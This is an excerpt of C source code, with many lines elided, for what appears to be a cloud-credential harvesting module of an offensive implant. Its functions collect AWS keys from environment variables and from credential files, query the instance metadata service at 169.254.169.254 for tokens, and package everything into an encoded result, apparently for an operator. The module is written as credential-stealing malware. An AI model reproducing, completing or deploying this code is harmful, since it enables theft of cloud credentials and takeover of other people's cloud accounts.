...
static void add_aws_env(ark_cloud_credential *creds, size_t *n) {
...
static int parse_aws_ini(const char *path, ark_cloud_credential *creds, size_t *n, size_t max) {
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    char line[512];
...
static int harvest_aws_files(ark_cloud_credential *creds, size_t *n, size_t max) {
    char home[MAX_PATH];
...
static int harvest_imds(char *metadata, size_t meta_cap, ark_cloud_token *tokens, size_t *tn, ark_cloud_credential *creds, size_t *cn) {
    char *body = NULL;
    size_t blen = 0;
    ...
    if (http_get(L"169.254.169.254", L"/metadata/instance?api-version=2021-02-01", meta_hdr, &body, &blen)) {
        ...
        if (http_get(L"169.254.169.254",
                ...
                meta_hdr, &body, &blen) && *tn < ARK_CLOUD_TOKEN_MAX) {
...
int ark_mod_cloud(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    ark_cloud_harvest_config cfg;
    if (!ark_pb_decode_cloud_harvest_config(config, config_len, &cfg)) return 0;
    ...
    ark_cloud_token tokens[ARK_CLOUD_TOKEN_MAX];
    size_t cn = 0, tn = 0;
    ...
    if (strcmp(provider, "aws") == 0 || strcmp(provider, "all") == 0) {
        ...
        if (strcmp(method, "creds") == 0 || strcmp(method, "cli") == 0 || strcmp(method, "all") == 0)
            harvest_aws_files(creds, &cn, ARK_CLOUD_CRED_MAX);
    }
    ...
    return ark_pb_encode_cloud_harvest_result(provider, method, tokens, tn, creds, cn, metadata, NULL, out, out_len);
}